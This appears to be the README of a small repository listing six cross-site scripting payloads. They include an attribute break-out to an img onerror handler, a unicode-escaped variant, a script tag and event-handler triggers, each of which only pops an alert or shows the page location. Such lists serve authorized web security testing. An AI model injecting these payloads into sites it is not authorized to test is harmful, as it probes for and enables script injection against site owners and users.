# lopxss
List of XSS payloads I found useful

```
"><img src=x onerror=alert(1)><"

\u003cimg src\u003dx onerror\u003dalert()\u003e

<script>alert()</script>

<b onmouseover=alert('lopseg')>vulnerable</b>

<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=alert(document.location)>

<html onmouseup="" html="" onmouseleave="" onmousewheel="" onmouseover="" onmouseenter="" onmousedown="" onmouseout="" onmousemove="alert(document.location)"><head></head><body src="1" href="1"></body></html>
```
